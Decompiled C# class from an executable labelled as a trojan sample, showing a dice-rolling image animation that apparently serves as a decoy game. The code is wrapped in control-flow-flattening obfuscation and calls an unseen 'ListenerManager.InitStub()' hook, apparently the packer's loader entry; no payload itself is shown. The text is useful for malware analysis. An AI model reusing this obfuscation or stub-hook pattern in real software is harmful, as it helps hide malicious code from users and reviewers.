// Decompiled with JetBrains decompiler
// Type: IEnumUnkn.Attributes.FactoryIdentifierAttribute
// Assembly: IEnumUnkn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA80F1E7-116A-4A8E-96EA-FFB7A6C2BB6E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-4e20a72f2791a602f8ee9999765a9365729ff929da4d5fa6be7bfb4c20e9989e.exe

using IEnumUnkn.Structs;
using RiskGame.Factories;
using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Media.Imaging;

namespace IEnumUnkn.Attributes
{
  public abstract class FactoryIdentifierAttribute
  {
    public BackgroundWorker tests;
    private static readonly Uri[] m_Iterator;
    public int _Tag;
    private Image mock;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public FactoryIdentifierAttribute(Image reference)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_3;
            case 1:
            case 5:
              goto label_1;
            case 2:
              this.tests.DoWork += new DoWorkEventHandler(this.PopMapper);
              goto case 4;
            case 4:
              this.tests.ProgressChanged += new ProgressChangedEventHandler(this.CustomizeMapper);
              this._Tag = -1;
              num2 = 6;
              continue;
            case 6:
              goto label_9;
            default:
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto label_8;
          }
        }
label_1:
        this.tests = new BackgroundWorker()
        {
          WorkerReportsProgress = true,
          WorkerSupportsCancellation = true
        };
        // ISSUE: explicit constructor call
        base.\u002Ector();
        this.mock = reference;
        num1 = 2;
        continue;
label_3:
        ListenerManager.InitStub();
        num1 = 5;
      }
label_9:
      return;
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void DisableMapper() => this.tests.RunWorkerAsync();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PopMapper(object item, DoWorkEventArgs token)
    {
      int num1 = 1;
      while (true)
      {
        int num2 = num1;
        int num3;
        int int32;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
            case 5:
              if (num3 < 6)
              {
                if (!this.tests.CancellationPending)
                {
                  int32 = Convert.ToInt32((double) num3 / 6.0 * 100.0);
                  if (true)
                  {
                    num2 = 6;
                    continue;
                  }
                  goto label_13;
                }
                else
                  goto label_11;
              }
              else
                goto label_2;
            case 1:
              goto label_8;
            case 2:
            case 3:
              (item as BackgroundWorker).ReportProgress(int32);
              Thread.Sleep(250);
              ++num3;
              if (FactoryIdentifierAttribute.ChangeObject())
              {
                num2 = 0;
                continue;
              }
              goto label_8;
            case 6:
              this._Tag = BaseCustomerFactory.ViewRequest().Next(0, 5);
              goto case 2;
            case 7:
              goto label_9;
            default:
              goto label_6;
          }
        }
label_2:
        num1 = 7;
        continue;
label_6:
        num1 = 2;
        continue;
label_8:
        num3 = 0;
        num1 = 5;
      }
label_9:
      return;
label_11:
      token.Cancel = true;
      return;
label_13:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CustomizeMapper(object ident, ProgressChangedEventArgs result) => this.mock.Source = (ImageSource) new BitmapImage(FactoryIdentifierAttribute.m_Iterator[this._Tag]);

    [MethodImpl(MethodImplOptions.NoInlining)]
    static FactoryIdentifierAttribute()
    {
      ListenerManager.InitStub();
      FactoryIdentifierAttribute.m_Iterator = new Uri[6]
      {
        new Uri("pack://siteoforigin:,,,/Images/Dice/imgDice1.png"),
        new Uri("pack://siteoforigin:,,,/Images/Dice/imgDice2.png"),
        new Uri("pack://siteoforigin:,,,/Images/Dice/imgDice3.png"),
        new Uri("pack://siteoforigin:,,,/Images/Dice/imgDice4.png"),
        new Uri("pack://siteoforigin:,,,/Images/Dice/imgDice5.png"),
        new Uri("pack://siteoforigin:,,,/Images/Dice/imgDice6.png")
      };
    }

    internal static bool ChangeObject() => true;

    internal static bool InitObject() => false;
  }
}
